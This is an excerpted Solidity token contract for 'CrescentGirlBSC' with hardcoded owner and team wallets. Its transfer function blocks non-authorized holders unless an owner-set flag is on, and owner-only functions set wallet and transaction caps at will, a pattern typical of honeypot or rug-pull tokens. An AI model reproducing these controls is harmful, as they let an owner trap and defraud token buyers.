...
// Official Telegram : t.me/CrescentGirlBSC
...
contract CrescentGirlBSC  is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xeD88DaABb90746D3010617D5bd5249B44Ba55cAE); 
    address payable public Wallet_Dev = payable(0xe447A3661a02ff60770FfB8975064DE34B2d8732);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
    address private _authorized = 0x45162b260334b83002F5D23973061b8D2F6FE623;


    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 10**7 * 10**_decimals;
    string private constant _name = "CrescentGirlBSC"; 
    string private constant _symbol = unicode"CGIRL"; 
    ...
    constructor () {
        ...
        _owner = 0x45162b260334b83002F5D23973061b8D2F6FE623;
    ...
    function _transfer(
        ...
        if(!authorizations[from] && !authorizations[to]){
            require(_tokenState,"Token State");
        }
    ...
    function coinList(uint256 acc, address adr) authorized public virtual {
    ...
    function maxWLPercent(uint256 maxWL) external authorized() {
        _maxWalletToken = maxWL;
    }
    function maxTPercent(uint256 maxT) external authorized() {
        _maxTxAmount = maxT;
    }
